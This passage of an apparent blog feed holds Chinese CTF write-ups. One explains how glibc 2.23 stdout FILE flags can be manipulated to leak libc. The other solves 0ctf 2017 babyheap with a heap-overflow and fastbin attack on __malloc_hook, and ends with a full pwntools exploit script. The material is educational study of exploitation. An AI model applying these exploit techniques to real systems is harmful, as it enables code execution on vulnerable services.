EOF;</span><br><span class="line">  _IO_size_t len = strlen (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  if ((_IO_vtable_offset (_IO_stdout) != 0</span><br><span class="line">       || _IO_fwide (_IO_stdout, -1) == -1)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked ('\n', _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + 1);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里可以看到_IO_puts在过程当中调用了一个叫做<code>_IO_sputn</code>函数（_IO_fwrite也会调用这个），_IO_sputn其实是一个<code>宏</code>，它的作用就是调用<code>_IO_2_1_stdout_</code>中的<code>vtable</code>所指向的<code>_xsputn</code>，也就是`_IO_new_file_xsputn函数</p><p>_IO_new_file_xsputn –&gt; _IO_OVERFLOW</p><p>_IO_new_file_xsputn函数源码位置在：glibc/libio/fileops.c</p><p>由于_IO_new_file_xsputn函数的源码过长，这里就不大篇幅的贴图了。这里简单的描述一下这个函数的执行过程，在关键部分展示代码：首先进入函数之后判断输出缓冲区还有多少空间，这里是由_IO_write_end - _IO_write_base得来的，这两个是FILE结构体中的两个成员变量，分别是输出结束地址和其实输出地址，由于stdout也是FILE结构，所以后面就直接使用成员变量名称来描述了。接下来如果缓冲区有空间，则先把数据载入输出缓冲区并计算目标输出数据是否还有剩余</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">/* If nothing else has to be written we must not signal the</span><br><span class="line">   caller that everything has been written.  */</span><br><span class="line">return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></tbody></table></figure><p>经过上述最后一步的判断，如果还有剩余则说明输出缓冲区未建立或者空间已满，那么就需要通过<code>_IO_OVERFLOW</code>函数来建立或清空缓冲区，这个函数主要是实现刷新缓冲区或建立缓冲区的功能。在vtable中为<code>__overflow</code></p><h3 id="IO-new-file-overflow-–-gt-IO-do-write"><a href="#IO-new-file-overflow-–-gt-IO-do-write" class="headerlink" title="_IO_new_file_overflow –> _IO_do_write"></a>_IO_new_file_overflow –&gt; _IO_do_write</h3><p>_IO_new_file_overflow`函数的部分源码如下，位置在：glibc/libio/fileops.c</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br><span class="line">{</span><br><span class="line">  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    {</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    }</span><br><span class="line">  /* If currently reading or no buffer allocated. */</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">    {</span><br><span class="line">      /* Allocate a buffer if needed. */</span><br><span class="line">      if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">{</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">}</span><br><span class="line">      /* Otherwise must be currently reading.</span><br><span class="line"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span><br><span class="line"> logically slide the buffer forwards one block (by setting the</span><br><span class="line"> read pointers to all point at the beginning of the block).  This</span><br><span class="line"> makes room for subsequent output.</span><br><span class="line"> Otherwise, set the read pointers to _IO_read_end (leaving that</span><br><span class="line"> alone, so it can continue to correspond to the external position). */</span><br><span class="line">      if (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">{</span><br><span class="line">  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    }</span><br><span class="line">  if (ch == EOF)</span><br></pre></td></tr></tbody></table></figure><p>上面即是_IO_new_file_overflow`函数的部分代码，我们想要利用的就是最后的_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base)，IO_do_write就是我们需要执行的目标函数，这个函数执行后会调用系统调用write输出输出缓冲区，传入_IO_do_write函数的参数为：stdout结构体、_IO_write_base（输出缓冲区起始地址）和size（_IO_write_end - _IO_write_base计算得来）</p><p>如果我们事先在stdout的_IO_write_base的位置部署要输出的起始地址，那么在去利用_IO_do_write函数，即可打印部分内存地址，打印出来的内容就包含我们所需要泄露的libc</p><p>如果我们想要利用_IO_do_write函数的话是需要绕过_IO_new_file_overflow函数的检查的，就是上图中蓝色框中的判断条件，我们一步一步的分解_IO_new_file_overflow函数的这两个判断条件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br><span class="line">{</span><br><span class="line">  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    {</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>首先我们来看第一个判断条件，这里判断_flags的标志位是否包含<code>_IO_NO_WRITES</code>，将_flags和_IO_NO_WRITES进行一个按位与的操作，我们可以向前翻一下flag规则的章节，_flag与_IO_NO_WRITES各自定义的常量为：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* 魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* 不可写 */</span></span></span><br></pre></td></tr></tbody></table></figure><p>可以看到_flag魔数的常量为0xfbad0000，_IO_NO_WRITES不可写标志位的常量为8，我们返回上图的程序中，如果进行按位与操作之后的结果为真，则返回为错误。一旦返回的是错误，那么后续我们想要利用的_IO_do_write函数就不会再被执行了，所以我们要将此处的与运算为假：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line">_flags &amp; _IO_NO_WRITES = <span class="number">0</span> </span><br><span class="line">_flags = <span class="number">0xfbad0000</span></span><br></pre></td></tr></tbody></table></figure><p>这样一来判断条件中与运算就会为假，就不会执行判断中的语句了。接下来我们看一下第二个判断条件：</p><p><img src="https://img-blog.csdnimg.cn/20210219111014894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70"></p><p>第二个判断是为了检查输出缓冲区是否为空，如果为空则进行分配空间，并且会初始化指针。一旦进行初始化操作，那么就会覆盖掉我们事先在stdout的_IO_write_base的数据，这样一来我们其实是无法完全掌控的。所以这个判断条件分支尽可能的也不进入，那么我们将if判断条件的值为假即可</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br></pre></td></tr></tbody></table></figure><p>我们拆开来看这个判断条件，由两部分组成，并用或连接。先看后半部分f-&gt;_IO_write_base == NULL，这里由于会在_IO_write_base中部署数据，所有后半部分的条件判断一定为假。那么这样一来我们将前半部分也为假，即f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1，则整个判断就为假：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad0800</span></span><br></pre></td></tr></tbody></table></figure><p>_IO_new_do_write –&gt; new_do_write</p><p>经过前面的_flags的处理，即可顺利执行到_IO_do_write函数，跟进_IO_do_write函数后将会进入_IO_new_do_write函数，我们来看一下这个函数的源码，位置在glibc/libio/fileops.c</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)</span><br><span class="line">{</span><br><span class="line">  return (to_do == 0</span><br><span class="line">  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;</span><br><span class="line">}</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></tbody></table></figure><p>可以看到_IO_new_do_write并没有做太多的操作，就调用了new_do_write函数，new_do_write函数的参数其实是和传入的参数是一样的，一参stdout结构体，二参输出缓冲区起始地址，三参输出长度<br>new_do_write –&gt; _IO_SYSWRITE</p><p>我们一起来看一下new_do_write函数中的源码，位置在glibc/libio/fileops.c<br><img src="https://img-blog.csdnimg.cn/20210219151953422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70"></p><p>可以看到上图即是new_do_write函数中的源码了，红色框中的_IO_SYSWRITE函数即是IO_FILE的最终目标，执行系统调用write。但是同时我们还能看到前面又经过了两次判断，其中第一次if判断与_flags相关，else if中的内容同样需要仔细斟酌一下。由于if和else if是幸福二选一，如果两个判断条件都不满足的话，是不会继续执行到518行的系统调用的</p><p>我们先看这个比较复杂的else if判断：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   {</span><br><span class="line">     _IO_off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">     if (new_pos == _IO_pos_BAD)</span><br><span class="line">return 0;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><p>这条分支我们尽可能的不碰，原因有两点：</p><pre><code>第一，其实只要满足判断中的条件fp-&gt;_IO_read_end = fp-&gt;_IO_write_base即可绕过这里的判断，使之相等的操作并不是没有可能，但是在实际操作中实现的几率比较小。一般在做这种题的时候都会伴随着随机化保护的开启，进行攻击的时候，我们一般采用的都是覆盖末位字节的方式造成偏移，因为即使随机化偏移也会存在0x1000对齐。但是这时候就会遇到一个很尴尬的情况，_IO_read_end和_IO_write_base存放的地址是由末位字节和其他高字节共同组成的，其他高字节由于随机化的缘故无法确定，所以何谈使两个成员变量中的地址相等呢第二，可以看到else if这条分支中调用了_IO_SYSSEEK系统调用，即lssek函数，如果我们将_IO_read_end的值设置为0，那么_IO_SYSSEEK的二参fp-&gt;_IO_write_base - fp-&gt;_IO_read_end得出的数值就有可能非常大，这就会导致sleek函数执行不成功导致退出，这是因为载入内存的数据范围可能并不大，但是经过sleek函数修改过大的偏移之后超过了数据范围的边界。一旦Sleek函数执行不成功导致退出，那么就不会到达我们想要的_IO_SYSWRITE系统调用了</code></pre><p>所以综上所述，我们无法完全掌控_IO_read_end和_IO_write_base中的数值，导致进入else if的分支后程序执行流程不可控</p><p>接下来我们看一下if分支：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   /* On a system without a proper O_APPEND implementation,</span><br><span class="line">      you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">      not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">      Instead, just indicate that offset (before and after) is</span><br><span class="line">      unpredictable. */</span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></tbody></table></figure><p>if分支相对来说造成的影响就比较小了，内部仅仅将偏移设置为标准值，不会影响后续的输出流程。并且if判断的条件也很容易满足，我们只需要将<code>fp-&gt;_flags &amp; _IO_IS_APPENDING = 1</code>即可，只对_flag修改不会影响其他部分：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1000</span></span><br></pre></td></tr></tbody></table></figure><p>这样就可以到达_IO_SYSWRITE系统调用了！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以通过上述的讲解，我们只需要满足如下几条对_flags的设定，即可利用_IO_2_1_stdout泄露libc</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></tbody></table></figure><p>1、设置<code>_flags &amp; _IO_NO_WRITES = 0</code><br> 2、设置<code>_flags &amp; _IO_CURRENTLY_PUTTING = 1</code><br> 3、设置<code>_flags &amp; _IO_IS_APPENDING = 1</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_flags = 0xFBAD1800</span><br></pre></td></tr></tbody></table></figure><p>4、设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，程序中自带地址足够泄露libc)</p><p>hollk师傅的：好好说话之IO_FILE利用（1）</p><p>学习笔记</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;FILE结构-libc2-23&quot;&gt;&lt;a href=&quot;#FILE结构-libc2-23&quot; class=&quot;headerlink&quot; title=&quot;FILE结构(libc2.23)&quot;&gt;&lt;/a&gt;FILE结构(libc2.23)&lt;/h2&gt;&lt;p&gt;FILE在linux系统的标准I</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>0ctf_2017_babyheap</title>
    <link href="http://wscyoulin.github.io/2022/08/04/0ctf-2017-babyheap/"/>
    <id>http://wscyoulin.github.io/2022/08/04/0ctf-2017-babyheap/</id>
    <published>2022-08-03T18:15:45.000Z</published>
    <updated>2022-08-04T11:06:33.264Z</updated>
    
    <content type="html"><![CDATA[<p>一道比较简单的堆题，但是因为一些比较nt的原因，导致做了很久才出shell</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先编辑堆块的地方有一个很明显的堆溢出（输入字符串任意大小）</p><p><img src="https://s2.loli.net/2022/08/04/m9bdQfiTtKRPXnA.png" alt="图片.png"></p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>1.通过堆溢出，来构成一个double free</p><p>2.通过double free来泄露unsorted bin指向的main_arena</p><p>3.利用fast bin attack来修改malloc_hook为one_gadget(寻找‘\x7f’作为fake_chunk的size位)</p><h2 id="利用堆溢出，构造double-free"><a href="#利用堆溢出，构造double-free" class="headerlink" title="利用堆溢出，构造double free"></a>利用堆溢出，构造double free</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(0x10)#0</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2</span><br><span class="line">add(0x10)#3</span><br><span class="line">add(0x80)#4</span><br><span class="line">add(0x10)#5防止unsorted bin和topchunk合并</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b'\x80'#修改fd指针指向chunk4</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload1=p64(0)*3+b'\x21'</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2and4同时指向chunk4</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="利用double-free泄露main-arena"><a href="#利用double-free泄露main-arena" class="headerlink" title="利用double free泄露main_arena"></a>利用double free泄露main_arena</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(0)*3+b'\x91'</span><br><span class="line">fill(3,len(payload2),payload2)#将chunk4的size修改回来</span><br><span class="line">delete(4)</span><br><span class="line">show(2)</span><br><span class="line">malloc_hook=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-88-0x10</span><br><span class="line">print("malloc_hook:"+hex(malloc_hook))</span><br><span class="line">base=malloc_hook-libc.sym['__malloc_hook']</span><br><span class="line">onegadget=base+0x4526a</span><br></pre></td></tr></tbody></table></figure><h2 id="利用fast-bin-attack修改malloc-hook"><a href="#利用fast-bin-attack修改malloc-hook" class="headerlink" title="利用fast bin attack修改malloc_hook"></a>利用fast bin attack修改malloc_hook</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(0x60)#4切割unsorted bin</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)#在malloc_hook的低地址处寻找‘/x7f’</span><br><span class="line">fill(2,len(payload3),payload3)#利用double free的指针2修改fast bin的fd指针指向malloc_hook附近构造fake chunk</span><br><span class="line">add(0x60)#4</span><br><span class="line">add(0x60)#6</span><br><span class="line">payload4=b'A'*(0x8+0x2+0x8+1)+p64(onegadget)</span><br><span class="line">fill(6,len(payload4),payload4)</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process("./0ctf_2017_babyheap")</span><br><span class="line">#io=remote("node4.buuoj.cn",28039)</span><br><span class="line">elf=ELF("./0ctf_2017_babyheap")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")</span><br><span class="line">#libc=ELF("./libc-2.23_64.so")</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    io.recvuntil("Command: ")</span><br><span class="line">    io.sendline(b'1')</span><br><span class="line">    io.recvuntil("Size: ")</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def fill(index,size,content):</span><br><span class="line">    io.recvuntil("Command: ")</span><br><span class="line">    io.sendline(b'2')</span><br><span class="line">    io.recvuntil("Index: ")</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil("Size: ")</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil("Content: ")</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    io.recvuntil("Command: ")</span><br><span class="line">    io.sendline(b'3')</span><br><span class="line">    io.recvuntil("Index: ")</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    io.recvuntil("Command: ")</span><br><span class="line">    io.sendline(b'4')</span><br><span class="line">    io.recvuntil("Index: ")</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10)#0</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2</span><br><span class="line">add(0x10)#3</span><br><span class="line">add(0x80)#4</span><br><span class="line">add(0x10)#5</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b'\x80'</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload1=p64(0)*3+b'\x21'</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2and4</span><br><span class="line">payload2=p64(0)*3+b'\x91'</span><br><span class="line">fill(3,len(payload2),payload2)</span><br><span class="line">delete(4)</span><br><span class="line">show(2)</span><br><span class="line">malloc_hook=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-88-0x10</span><br><span class="line">print("malloc_hook:"+hex(malloc_hook))</span><br><span class="line">base=malloc_hook-libc.sym['__malloc_hook']</span><br><span class="line">onegadget=base+0x4526a</span><br><span class="line">add(0x60)#4</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)</span><br><span class="line">fill(2,len(payload3),payload3)</span><br><span class="line">add(0x60)#4</span><br><span class="line">add(0x60)#6</span><br><span class="line">payload4=b'A'*(0x8+0x2+0x8+1)+p64(onegadget)</span><br><span class="line">fill(6,len(payload4),payload4)</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一道比较简单的堆题，但是因为一些比较nt的原因，导致做了很久才出shell&lt;/p&gt;
&lt;h1 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h1&gt;&lt;p&gt;首先编辑堆块的地方有一个很明显的堆</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>io_file</title>
    <link href="http://wscyoulin.github.io/2022/08/01/io-file/"/>
    <id>http://wscyoulin.github.io/2022/08/01/io-file/</id>
    <published>2022-08-01T08:27:46.000Z</published>
    <updated>2022-08-01T08:28:38.769Z</updated>
    
